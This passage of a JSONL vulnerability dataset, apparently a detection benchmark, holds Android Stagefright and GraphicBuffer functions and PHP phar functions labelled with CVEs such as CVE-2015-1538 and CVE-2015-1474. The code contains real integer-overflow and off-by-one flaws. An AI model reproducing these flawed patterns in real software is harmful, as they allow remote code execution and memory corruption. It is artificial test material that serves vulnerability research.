ERROR_IO;\n }\n\n char lang_code[4];\n            lang_code[0] = ((lang[0] >> 2) & 0x1f) + 0x60;\n            lang_code[1] = ((lang[0] & 0x3) << 3 | (lang[1] >> 5)) + 0x60;\n            lang_code[2] = (lang[1] & 0x1f) + 0x60;\n            lang_code[3] = '\\0';\n\n            mLastTrack->meta->setCString(\n                    kKeyMediaLanguage, lang_code);\n\n break;\n }\n\n case FOURCC('s', 't', 's', 'd'):\n {\n if (chunk_data_size < 8) {\n return ERROR_MALFORMED;\n }\n\n uint8_t buffer[8];\n if (chunk_data_size < (off64_t)sizeof(buffer)) {\n return ERROR_MALFORMED;\n }\n\n if (mDataSource->readAt(\n                        data_offset, buffer, 8) < 8) {\n return ERROR_IO;\n }\n\n if (U32_AT(buffer) != 0) {\n return ERROR_MALFORMED;\n }\n\n uint32_t entry_count = U32_AT(&buffer[4]);\n\n if (entry_count > 1) {\n const char *mime;\n                CHECK(mLastTrack->meta->findCString(kKeyMIMEType, &mime));\n if (strcasecmp(mime, MEDIA_MIMETYPE_TEXT_3GPP) &&\n                        strcasecmp(mime, \"application/octet-stream\")) {\n                    mLastTrack->skipTrack = true;\n *offset += chunk_size;\n break;\n }\n }\n off64_t stop_offset = *offset + chunk_size;\n *offset = data_offset + 8;\n for (uint32_t i = 0; i < entry_count; ++i) {\n status_t err = parseChunk(offset, depth + 1);\n if (err != OK) {\n return err;\n }\n }\n\n if (*offset != stop_offset) {\n return ERROR_MALFORMED;\n }\n break;\n }\n\n case FOURCC('m', 'p', '4', 'a'):\n case FOURCC('e', 'n', 'c', 'a'):\n case FOURCC('s', 'a', 'm', 'r'):\n case FOURCC('s', 'a', 'w', 'b'):\n {\n uint8_t buffer[8 + 20];\n if (chunk_data_size < (ssize_t)sizeof(buffer)) {\n return ERROR_MALFORMED;\n }\n\n if (mDataSource->readAt(\n                        data_offset, buffer, sizeof(buffer)) < (ssize_t)sizeof(buffer)) {\n return ERROR_IO;\n }\n\n uint16_t data_ref_index = U16_AT(&buffer[6]);\n uint32_t num_channels = U16_AT(&buffer[16]);\n\n uint16_t sample_size = U16_AT(&buffer[18]);\n uint32_t sample_rate = U32_AT(&buffer[24]) >> 16;\n\n if (chunk_type != FOURCC('e', 'n', 'c', 'a')) {\n                mLastTrack->meta->setCString(kKeyMIMEType, FourCC2MIME(chunk_type));\n AdjustChannelsAndRate(chunk_type, &num_channels, &sample_rate);\n }\n            ALOGV(\"*** coding='%s' %d channels, size %d, rate %d\\n\",\n                   chunk, num_channels, sample_size, sample_rate);\n            mLastTrack->meta->setInt32(kKeyChannelCount, num_channels);\n            mLastTrack->meta->setInt32(kKeySampleRate, sample_rate);\n\n off64_t stop_offset = *offset + chunk_size;\n *offset = data_offset + sizeof(buffer);\n while (*offset < stop_offset) {\n status_t err = parseChunk(offset, depth + 1);\n if (err != OK) {\n return err;\n }\n }\n\n if (*offset != stop_offset) {\n return ERROR_MALFORMED;\n }\n break;\n }\n\n case FOURCC('m', 'p', '4', 'v'):\n case FOURCC('e', 'n', 'c', 'v'):\n case FOURCC('s', '2', '6', '3'):\n case FOURCC('H', '2', '6', '3'):\n case FOURCC('h', '2', '6', '3'):\n case FOURCC('a', 'v', 'c', '1'):\n case FOURCC('h', 'v', 'c', '1'):\n case FOURCC('h', 'e', 'v', '1'):\n {\n            mHasVideo = true;\n\n uint8_t buffer[78];\n if (chunk_data_size < (ssize_t)sizeof(buffer)) {\n return ERROR_MALFORMED;\n }\n\n if (mDataSource->readAt(\n                        data_offset, buffer, sizeof(buffer)) < (ssize_t)sizeof(buffer)) {\n return ERROR_IO;\n }\n\n uint16_t data_ref_index = U16_AT(&buffer[6]);\n uint16_t width = U16_AT(&buffer[6 + 18]);\n uint16_t height = U16_AT(&buffer[6 + 20]);\n\n if (width == 0)  width  = 352;\n if (height == 0) height = 288;\n\n\n if (chunk_type != FOURCC('e', 'n', 'c', 'v')) {\n                mLastTrack->meta->setCString(kKeyMIMEType, FourCC2MIME(chunk_type));\n }\n            mLastTrack->meta->setInt32(kKeyWidth, width);\n            mLastTrack->meta->setInt32(kKeyHeight, height);\n\n off64_t stop_offset = *offset + chunk_size;\n *offset = data_offset + sizeof(buffer);\n while (*offset < stop_offset) {\n status_t err = parseChunk(offset, depth + 1);\n if (err != OK) {\n return err;\n }\n }\n\n if (*offset != stop_offset) {\n return ERROR_MALFORMED;\n }\n break;\n }\n\n case FOURCC('s', 't', 'c', 'o'):\n case FOURCC('c', 'o', '6', '4'):\n {\n status_t err =\n                mLastTrack->sampleTable->setChunkOffsetParams(\n                        chunk_type, data_offset, chunk_data_size);\n\n *offset += chunk_size;\n\n if (err != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('s', 't', 's', 'c'):\n {\n status_t err =\n                mLastTrack->sampleTable->setSampleToChunkParams(\n                        data_offset, chunk_data_size);\n\n *offset += chunk_size;\n\n if (err != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('s', 't', 's', 'z'):\n case FOURCC('s', 't', 'z', '2'):\n {\n status_t err =\n                mLastTrack->sampleTable->setSampleSizeParams(\n                        chunk_type, data_offset, chunk_data_size);\n\n *offset += chunk_size;\n\n if (err != OK) {\n return err;\n }\n\n size_t max_size;\n            err = mLastTrack->sampleTable->getMaxSampleSize(&max_size);\n\n if (err != OK) {\n return err;\n }\n\n if (max_size != 0) {\n                mLastTrack->meta->setInt32(kKeyMaxInputSize, max_size + 10 * 2);\n } else {\n int32_t width, height;\n if (!mLastTrack->meta->findInt32(kKeyWidth, &width) ||\n !mLastTrack->meta->findInt32(kKeyHeight, &height)) {\n                    ALOGE(\"No width or height, assuming worst case 1080p\");\n                    width = 1920;\n                    height = 1080;\n }\n\n const char *mime;\n                CHECK(mLastTrack->meta->findCString(kKeyMIMEType, &mime));\n if (!strcmp(mime, MEDIA_MIMETYPE_VIDEO_AVC)) {\n                    max_size = ((width + 15) / 16) * ((height + 15) / 16) * 192;\n } else {\n                    max_size = width * height * 3 / 2;\n }\n                mLastTrack->meta->setInt32(kKeyMaxInputSize, max_size);\n }\n\n const char *mime;\n            CHECK(mLastTrack->meta->findCString(kKeyMIMEType, &mime));\n if (!strncasecmp(\"video/\", mime, 6)) {\n size_t nSamples = mLastTrack->sampleTable->countSamples();\n int64_t durationUs;\n if (mLastTrack->meta->findInt64(kKeyDuration, &durationUs)) {\n if (durationUs > 0) {\n int32_t frameRate = (nSamples * 1000000LL +\n (durationUs >> 1)) / durationUs;\n                        mLastTrack->meta->setInt32(kKeyFrameRate, frameRate);\n }\n }\n }\n\n break;\n }\n\n case FOURCC('s', 't', 't', 's'):\n {\n *offset += chunk_size;\n\n status_t err =\n                mLastTrack->sampleTable->setTimeToSampleParams(\n                        data_offset, chunk_data_size);\n\n if (err != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('c', 't', 't', 's'):\n {\n *offset += chunk_size;\n\n status_t err =\n                mLastTrack->sampleTable->setCompositionTimeToSampleParams(\n                        data_offset, chunk_data_size);\n\n if (err != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('s', 't', 's', 's'):\n {\n *offset += chunk_size;\n\n status_t err =\n                mLastTrack->sampleTable->setSyncSampleParams(\n                        data_offset, chunk_data_size);\n\n if (err != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('\\xA9', 'x', 'y', 'z'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 8) {\n return ERROR_MALFORMED;\n }\n\n char buffer[18];\n\n off64_t location_length = chunk_data_size - 5;\n if (location_length >= (off64_t) sizeof(buffer)) {\n return ERROR_MALFORMED;\n }\n\n if (mDataSource->readAt(\n                        data_offset + 4, buffer, location_length) < location_length) {\n return ERROR_IO;\n }\n\n            buffer[location_length] = '\\0';\n            mFileMetaData->setCString(kKeyLocation, buffer);\n break;\n }\n\n case FOURCC('e', 's', 'd', 's'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 4) {\n return ERROR_MALFORMED;\n }\n\n uint8_t buffer[256];\n if (chunk_data_size > (off64_t)sizeof(buffer)) {\n return ERROR_BUFFER_TOO_SMALL;\n }\n\n if (mDataSource->readAt(\n                        data_offset, buffer, chunk_data_size) < chunk_data_size) {\n return ERROR_IO;\n }\n\n if (U32_AT(buffer) != 0) {\n return ERROR_MALFORMED;\n }\n\n            mLastTrack->meta->setData(\n                    kKeyESDS, kTypeESDS, &buffer[4], chunk_data_size - 4);\n\n if (mPath.size() >= 2\n && mPath[mPath.size() - 2] == FOURCC('m', 'p', '4', 'a')) {\n\n status_t err = updateAudioTrackInfoFromESDS_MPEG4Audio(\n &buffer[4], chunk_data_size - 4);\n\n if (err != OK) {\n return err;\n }\n }\n\n break;\n }\n\n case FOURCC('a', 'v', 'c', 'C'):\n {\n *offset += chunk_size;\n\n            sp<ABuffer> buffer = new ABuffer(chunk_data_size);\n\n if (mDataSource->readAt(\n                        data_offset, buffer->data(), chunk_data_size) < chunk_data_size) {\n return ERROR_IO;\n }\n\n            mLastTrack->meta->setData(\n                    kKeyAVCC, kTypeAVCC, buffer->data(), chunk_data_size);\n\n break;\n }\n case FOURCC('h', 'v', 'c', 'C'):\n {\n            sp<ABuffer> buffer = new ABuffer(chunk_data_size);\n\n if (mDataSource->readAt(\n                        data_offset, buffer->data(), chunk_data_size) < chunk_data_size) {\n return ERROR_IO;\n }\n\n            mLastTrack->meta->setData(\n                    kKeyHVCC, kTypeHVCC, buffer->data(), chunk_data_size);\n\n *offset += chunk_size;\n break;\n }\n\n case FOURCC('d', '2', '6', '3'):\n {\n *offset += chunk_size;\n /*\n             * d263 contains a fixed 7 bytes part:\n             *   vendor - 4 bytes\n             *   version - 1 byte\n             *   level - 1 byte\n             *   profile - 1 byte\n             * optionally, \"d263\" box itself may contain a 16-byte\n             * bit rate box (bitr)\n             *   average bit rate - 4 bytes\n             *   max bit rate - 4 bytes\n             */\n char buffer[23];\n if (chunk_data_size != 7 &&\n                chunk_data_size != 23) {\n                ALOGE(\"Incorrect D263 box size %lld\", chunk_data_size);\n return ERROR_MALFORMED;\n }\n\n if (mDataSource->readAt(\n                    data_offset, buffer, chunk_data_size) < chunk_data_size) {\n return ERROR_IO;\n }\n\n            mLastTrack->meta->setData(kKeyD263, kTypeD263, buffer, chunk_data_size);\n\n break;\n }\n\n case FOURCC('m', 'e', 't', 'a'):\n {\n uint8_t buffer[4];\n if (chunk_data_size < (off64_t)sizeof(buffer)) {\n *offset += chunk_size;\n return ERROR_MALFORMED;\n }\n\n if (mDataSource->readAt(\n                        data_offset, buffer, 4) < 4) {\n *offset += chunk_size;\n return ERROR_IO;\n }\n\n if (U32_AT(buffer) != 0) {\n\n *offset += chunk_size;\n return OK;\n }\n\n off64_t stop_offset = *offset + chunk_size;\n *offset = data_offset + sizeof(buffer);\n while (*offset < stop_offset) {\n status_t err = parseChunk(offset, depth + 1);\n if (err != OK) {\n return err;\n }\n }\n\n if (*offset != stop_offset) {\n return ERROR_MALFORMED;\n }\n break;\n }\n\n case FOURCC('m', 'e', 'a', 'n'):\n case FOURCC('n', 'a', 'm', 'e'):\n case FOURCC('d', 'a', 't', 'a'):\n {\n *offset += chunk_size;\n\n if (mPath.size() == 6 && underMetaDataPath(mPath)) {\n status_t err = parseITunesMetaData(data_offset, chunk_data_size);\n\n if (err != OK) {\n return err;\n }\n }\n\n break;\n }\n\n case FOURCC('m', 'v', 'h', 'd'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 32) {\n return ERROR_MALFORMED;\n }\n\n uint8_t header[32];\n if (mDataSource->readAt(\n                        data_offset, header, sizeof(header))\n < (ssize_t)sizeof(header)) {\n return ERROR_IO;\n }\n\n uint64_t creationTime;\n uint64_t duration = 0;\n if (header[0] == 1) {\n                creationTime = U64_AT(&header[4]);\n                mHeaderTimescale = U32_AT(&header[20]);\n                duration = U64_AT(&header[24]);\n if (duration == 0xffffffffffffffff) {\n                    duration = 0;\n }\n } else if (header[0] != 0) {\n return ERROR_MALFORMED;\n } else {\n                creationTime = U32_AT(&header[4]);\n                mHeaderTimescale = U32_AT(&header[12]);\n uint32_t d32 = U32_AT(&header[16]);\n if (d32 == 0xffffffff) {\n                    d32 = 0;\n }\n                duration = d32;\n }\n if (duration != 0) {\n                mFileMetaData->setInt64(kKeyDuration, duration * 1000000 / mHeaderTimescale);\n }\n\n String8 s;\n            convertTimeToDate(creationTime, &s);\n\n            mFileMetaData->setCString(kKeyDate, s.string());\n\n break;\n }\n\n case FOURCC('m', 'e', 'h', 'd'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 8) {\n return ERROR_MALFORMED;\n }\n\n uint8_t flags[4];\n if (mDataSource->readAt(\n                        data_offset, flags, sizeof(flags))\n < (ssize_t)sizeof(flags)) {\n return ERROR_IO;\n }\n\n uint64_t duration = 0;\n if (flags[0] == 1) {\n if (chunk_data_size < 12) {\n return ERROR_MALFORMED;\n }\n                mDataSource->getUInt64(data_offset + 4, &duration);\n if (duration == 0xffffffffffffffff) {\n                    duration = 0;\n }\n } else if (flags[0] == 0) {\n uint32_t d32;\n                mDataSource->getUInt32(data_offset + 4, &d32);\n if (d32 == 0xffffffff) {\n                    d32 = 0;\n }\n                duration = d32;\n } else {\n return ERROR_MALFORMED;\n }\n\n if (duration != 0) {\n                mFileMetaData->setInt64(kKeyDuration, duration * 1000000 / mHeaderTimescale);\n }\n\n break;\n }\n\n case FOURCC('m', 'd', 'a', 't'):\n {\n            ALOGV(\"mdat chunk, drm: %d\", mIsDrm);\n if (!mIsDrm) {\n *offset += chunk_size;\n break;\n }\n\n if (chunk_size < 8) {\n return ERROR_MALFORMED;\n }\n\n return parseDrmSINF(offset, data_offset);\n }\n\n case FOURCC('h', 'd', 'l', 'r'):\n {\n *offset += chunk_size;\n\n uint32_t buffer;\n if (mDataSource->readAt(\n                        data_offset + 8, &buffer, 4) < 4) {\n return ERROR_IO;\n }\n\n uint32_t type = ntohl(buffer);\n if (type == FOURCC('t', 'e', 'x', 't') || type == FOURCC('s', 'b', 't', 'l')) {\n                mLastTrack->meta->setCString(kKeyMIMEType, MEDIA_MIMETYPE_TEXT_3GPP);\n }\n\n break;\n }\n\n case FOURCC('t', 'r', 'e', 'x'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 24) {\n return ERROR_IO;\n }\n uint32_t duration;\n Trex trex;\n if (!mDataSource->getUInt32(data_offset + 4, &trex.track_ID) ||\n !mDataSource->getUInt32(data_offset + 8, &trex.default_sample_description_index) ||\n !mDataSource->getUInt32(data_offset + 12, &trex.default_sample_duration) ||\n !mDataSource->getUInt32(data_offset + 16, &trex.default_sample_size) ||\n !mDataSource->getUInt32(data_offset + 20, &trex.default_sample_flags)) {\n return ERROR_IO;\n }\n            mTrex.add(trex);\n break;\n }\n\n case FOURCC('t', 'x', '3', 'g'):\n {\n uint32_t type;\n const void *data;\n size_t size = 0;\n if (!mLastTrack->meta->findData(\n                    kKeyTextFormatData, &type, &data, &size)) {\n\n                 size = 0;\n             }\n \n            if (SIZE_MAX - chunk_size <= size) {\n                 return ERROR_MALFORMED;\n             }\n \n uint8_t *buffer = new uint8_t[size + chunk_size];\n if (buffer == NULL) {\n return ERROR_MALFORMED;\n }\n\n if (size > 0) {\n                memcpy(buffer, data, size);\n }\n\n if ((size_t)(mDataSource->readAt(*offset, buffer + size, chunk_size))\n < chunk_size) {\n delete[] buffer;\n                buffer = NULL;\n\n *offset += chunk_size;\n return ERROR_IO;\n }\n\n            mLastTrack->meta->setData(\n                    kKeyTextFormatData, 0, buffer, size + chunk_size);\n\n delete[] buffer;\n\n *offset += chunk_size;\n break;\n }\n\n case FOURCC('c', 'o', 'v', 'r'):\n {\n *offset += chunk_size;\n\n if (mFileMetaData != NULL) {\n                ALOGV(\"chunk_data_size = %lld and data_offset = %lld\",\n                        chunk_data_size, data_offset);\n\n if (chunk_data_size >= SIZE_MAX - 1) {\n return ERROR_MALFORMED;\n }\n                sp<ABuffer> buffer = new ABuffer(chunk_data_size + 1);\n if (mDataSource->readAt(\n                    data_offset, buffer->data(), chunk_data_size) != (ssize_t)chunk_data_size) {\n return ERROR_IO;\n }\n const int kSkipBytesOfDataBox = 16;\n if (chunk_data_size <= kSkipBytesOfDataBox) {\n return ERROR_MALFORMED;\n }\n\n                mFileMetaData->setData(\n                    kKeyAlbumArt, MetaData::TYPE_NONE,\n                    buffer->data() + kSkipBytesOfDataBox, chunk_data_size - kSkipBytesOfDataBox);\n }\n\n break;\n }\n\n case FOURCC('t', 'i', 't', 'l'):\n case FOURCC('p', 'e', 'r', 'f'):\n case FOURCC('a', 'u', 't', 'h'):\n case FOURCC('g', 'n', 'r', 'e'):\n case FOURCC('a', 'l', 'b', 'm'):\n case FOURCC('y', 'r', 'r', 'c'):\n {\n *offset += chunk_size;\n\n status_t err = parse3GPPMetaData(data_offset, chunk_data_size, depth);\n\n if (err != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('I', 'D', '3', '2'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 6) {\n return ERROR_MALFORMED;\n }\n\n            parseID3v2MetaData(data_offset + 6);\n\n break;\n }\n\n case FOURCC('-', '-', '-', '-'):\n {\n            mLastCommentMean.clear();\n            mLastCommentName.clear();\n            mLastCommentData.clear();\n *offset += chunk_size;\n break;\n }\n\n case FOURCC('s', 'i', 'd', 'x'):\n {\n            parseSegmentIndex(data_offset, chunk_data_size);\n *offset += chunk_size;\n return UNKNOWN_ERROR; // stop parsing after sidx\n }\n\n default:\n {\n *offset += chunk_size;\n break;\n }\n }\n\n return OK;\n}\n", "func_hash": 36800442274222177665926713351411195962, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-3864", "cve_desc": "Integer underflow in the MPEG4Extractor::parseChunk function in MPEG4Extractor.cpp in libstagefright in mediaserver in Android before 5.1.1 LMY48M allows remote attackers to execute arbitrary code via crafted MPEG-4 data, aka internal bug 23034759.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2015-3824.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3864"}
{"idx": 10127, "project": "Android", "commit_id": "2434839bbd168469f80dd9a22f1328bc81046398", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/av/+/2434839bbd168469f80dd9a22f1328bc81046398", "commit_message": "None", "target": 1, "func": "status_t SampleTable::setSampleToChunkParams(\n off64_t data_offset, size_t data_size) {\n if (mSampleToChunkOffset >= 0) {\n return ERROR_MALFORMED;\n }\n\n    mSampleToChunkOffset = data_offset;\n\n if (data_size < 8) {\n return ERROR_MALFORMED;\n }\n\n uint8_t header[8];\n if (mDataSource->readAt(\n                data_offset, header, sizeof(header)) < (ssize_t)sizeof(header)) {\n return ERROR_IO;\n }\n\n if (U32_AT(header) != 0) {\n return ERROR_MALFORMED;\n }\n\n    mNumSampleToChunkOffsets = U32_AT(&header[4]);\n\n if (data_size < 8 + mNumSampleToChunkOffsets * 12) {\n\n         return ERROR_MALFORMED;\n     }\n \n     mSampleToChunkEntries =\n         new SampleToChunkEntry[mNumSampleToChunkOffsets];\n \n for (uint32_t i = 0; i < mNumSampleToChunkOffsets; ++i) {\n uint8_t buffer[12];\n if (mDataSource->readAt(\n                    mSampleToChunkOffset + 8 + i * 12, buffer, sizeof(buffer))\n != (ssize_t)sizeof(buffer)) {\n return ERROR_IO;\n }\n\n        CHECK(U32_AT(buffer) >= 1); // chunk index is 1 based in the spec.\n\n        mSampleToChunkEntries[i].startChunk = U32_AT(buffer) - 1;\n        mSampleToChunkEntries[i].samplesPerChunk = U32_AT(&buffer[4]);\n        mSampleToChunkEntries[i].chunkDesc = U32_AT(&buffer[8]);\n }\n\n return OK;\n}\n", "func_hash": 257356045235322350872661029709383949189, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1538", "cve_desc": "Integer overflow in the SampleTable::setSampleToChunkParams function in SampleTable.cpp in libstagefright in Android before 5.1.1 LMY48I allows remote attackers to execute arbitrary code via crafted atoms in MP4 data that trigger an unchecked multiplication, aka internal bug 20139950, a related issue to CVE-2015-4496.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1538"}
{"idx": 10128, "project": "Android", "commit_id": "38803268570f90e97452cd9a30ac831661829091", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/native/+/38803268570f90e97452cd9a30ac831661829091", "commit_message": "None", "target": 1, "func": "status_t GraphicBuffer::unflatten(\n void const*& buffer, size_t& size, int const*& fds, size_t& count) {\n if (size < 8*sizeof(int)) return NO_MEMORY;\n\n int const* buf = static_cast<int const*>(buffer);\n if (buf[0] != 'GBFR') return BAD_TYPE;\n\n\n     const size_t numFds  = buf[8];\n     const size_t numInts = buf[9];\n \n     const size_t sizeNeeded = (10 + numInts) * sizeof(int);\n     if (size < sizeNeeded) return NO_MEMORY;\n \n    size_t fdCountNeeded = 0;\n     if (count < fdCountNeeded) return NO_MEMORY;\n \n     if (handle) {\n        free_handle();\n }\n\n if (numFds || numInts) {\n        width  = buf[1];\n        height = buf[2];\n        stride = buf[3];\n\n         format = buf[4];\n         usage  = buf[5];\n         native_handle* h = native_handle_create(numFds, numInts);\n         memcpy(h->data,          fds,     numFds*sizeof(int));\n         memcpy(h->data + numFds, &buf[10], numInts*sizeof(int));\n         handle = h;\n } else {\n        width = height = stride = format = usage = 0;\n        handle = NULL;\n }\n\n    mId = static_cast<uint64_t>(buf[6]) << 32;\n    mId |= static_cast<uint32_t>(buf[7]);\n\n    mOwner = ownHandle;\n\n if (handle != 0) {\n status_t err = mBufferMapper.registerBuffer(handle);\n if (err != NO_ERROR) {\n            width = height = stride = format = usage = 0;\n            handle = NULL;\n            ALOGE(\"unflatten: registerBuffer failed: %s (%d)\",\n                    strerror(-err), err);\n return err;\n }\n }\n\n    buffer = reinterpret_cast<void const*>(static_cast<int const*>(buffer) + sizeNeeded);\n    size -= sizeNeeded;\n    fds += numFds;\n    count -= numFds;\n\n return NO_ERROR;\n}\n", "func_hash": 340179419665331346744432113173670639202, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1474", "cve_desc": "Multiple integer overflows in the GraphicBuffer::unflatten function in platform/frameworks/native/libs/ui/GraphicBuffer.cpp in Android through 5.0 allow attackers to gain privileges or cause a denial of service (memory corruption) via vectors that trigger a large number of (1) file descriptors or (2) integer values.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1474"}
{"idx": 10260, "project": "php", "commit_id": "1ddf72180a52d247db88ea42a3e35f824a8fbda1", "project_url": "https://git.php.net/?p=php-src", "commit_url": "https://git.php.net/?p=php-src.git;a=commit;h=1ddf72180a52d247db88ea42a3e35f824a8fbda1", "commit_message": "None", "target": 1, "func": "static php_stream *phar_make_dirstream(char *dir, HashTable *manifest TSRMLS_DC) /* {{{ */\n{\n\tHashTable *data;\n\tint dirlen = strlen(dir);\n\tphar_zstr key;\n\tchar *entry, *found, *save, *str_key;\n\tuint keylen;\n\tulong unused;\n\n\tALLOC_HASHTABLE(data);\n\tzend_hash_init(data, 64, zend_get_hash_value, NULL, 0);\n\n\tif ((*dir == '/' && dirlen == 1 && (manifest->nNumOfElements == 0)) || (dirlen >= sizeof(\".phar\")-1 && !memcmp(dir, \".phar\", sizeof(\".phar\")-1))) {\n\t\t/* make empty root directory for empty phar */\n\t\t/* make empty directory for .phar magic directory */\n\t\tefree(dir);\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t}\n\n        zend_hash_internal_pointer_reset(manifest);\n \n        while (FAILURE != zend_hash_has_more_elements(manifest)) {\n               if (HASH_KEY_IS_STRING != zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {\n                        break;\n                }\n \n\t\tPHAR_STR(key, str_key);\n\n\t\tif (keylen <= (uint)dirlen) {\n\t\t\tif (keylen < (uint)dirlen || !strncmp(str_key, dir, dirlen)) {\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tif (*dir == '/') {\n\t\t\t/* root directory */\n\t\t\tif (keylen >= sizeof(\".phar\")-1 && !memcmp(str_key, \".phar\", sizeof(\".phar\")-1)) {\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\t/* do not add any magic entries to this directory */\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif (NULL != (found = (char *) memchr(str_key, '/', keylen))) {\n\t\t\t\t/* the entry has a path separator and is a subdirectory */\n\t\t\t\tentry = (char *) safe_emalloc(found - str_key, 1, 1);\n\t\t\t\tmemcpy(entry, str_key, found - str_key);\n\t\t\t\tkeylen = found - str_key;\n\t\t\t\tentry[keylen] = '\\0';\n\t\t\t} else {\n\t\t\t\tentry = (char *) safe_emalloc(keylen, 1, 1);\n\t\t\t\tmemcpy(entry, str_key, keylen);\n\t\t\t\tentry[keylen] = '\\0';\n\t\t\t}\n\n\t\t\tPHAR_STR_FREE(str_key);\n\t\t\tgoto PHAR_ADD_ENTRY;\n\t\t} else {\n\t\t\tif (0 != memcmp(str_key, dir, dirlen)) {\n\t\t\t\t/* entry in directory not found */\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t} else {\n\t\t\t\tif (str_key[dirlen] != '/') {\n\t\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tsave = str_key;\n\t\tsave += dirlen + 1; /* seek to just past the path separator */\n\n\t\tif (NULL != (found = (char *) memchr(save, '/', keylen - dirlen - 1))) {\n\t\t\t/* is subdirectory */\n\t\t\tsave -= dirlen + 1;\n\t\t\tentry = (char *) safe_emalloc(found - save + dirlen, 1, 1);\n\t\t\tmemcpy(entry, save + dirlen + 1, found - save - dirlen - 1);\n\t\t\tkeylen = found - save - dirlen - 1;\n\t\t\tentry[keylen] = '\\0';\n\t\t} else {\n\t\t\t/* is file */\n\t\t\tsave -= dirlen + 1;\n\t\t\tentry = (char *) safe_emalloc(keylen - dirlen, 1, 1);\n\t\t\tmemcpy(entry, save + dirlen + 1, keylen - dirlen - 1);\n\t\t\tentry[keylen - dirlen - 1] = '\\0';\n\t\t\tkeylen = keylen - dirlen - 1;\n\t\t}\n\t\tPHAR_STR_FREE(str_key);\nPHAR_ADD_ENTRY:\n\t\tif (keylen) {\n\t\t\tphar_add_empty(data, entry, keylen);\n\t\t}\n\n\t\tefree(entry);\n\n\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (FAILURE != zend_hash_has_more_elements(data)) {\n\t\tefree(dir);\n\t\tif (zend_hash_sort(data, zend_qsort, phar_compare_dir_name, 0 TSRMLS_CC) == FAILURE) {\n\t\t\tFREE_HASHTABLE(data);\n\t\t\treturn NULL;\n\t\t}\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t} else {\n\t\tefree(dir);\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t}\n}\n/* }}}*/\n", "func_hash": 196906810819803117252167181256778455219, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-7804", "cve_desc": "Off-by-one error in the phar_parse_zipfile function in ext/phar/zip.c in PHP before 5.5.30 and 5.6.x before 5.6.14 allows remote attackers to cause a denial of service (uninitialized pointer dereference and application crash) by including the / filename in a .zip PHAR archive.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-7804"}
{"idx": 10261, "project": "php", "commit_id": "1ddf72180a52d247db88ea42a3e35f824a8fbda2", "project_url": "https://git.php.net/?p=php-src", "commit_url": "https://git.php.net/?p=php-src.git;a=commit;h=1ddf72180a52d247db88ea42a3e35f824a8fbda1", "commit_message": "None", "target": 1, "func": "void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */\n{\n\tconst char *s;\n \n        while ((s = zend_memrchr(filename, '/', filename_len))) {\n                filename_len = s - filename;\n               if (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {\n                        break;\n                }\n        }\n}\n/* }}} */\n", "func_hash": 191317651340703261586509443599515973094, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-7804", "cve_desc": "Off-by-one error in the phar_parse_zipfile function in ext/phar/zip.c in PHP before 5.5.30 and 5.6.x before 5.6.14 allows remote attackers to cause a denial of service (uninitialized pointer dereference and application crash) by including the / filename in a .zip PHAR archive.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-7804"}
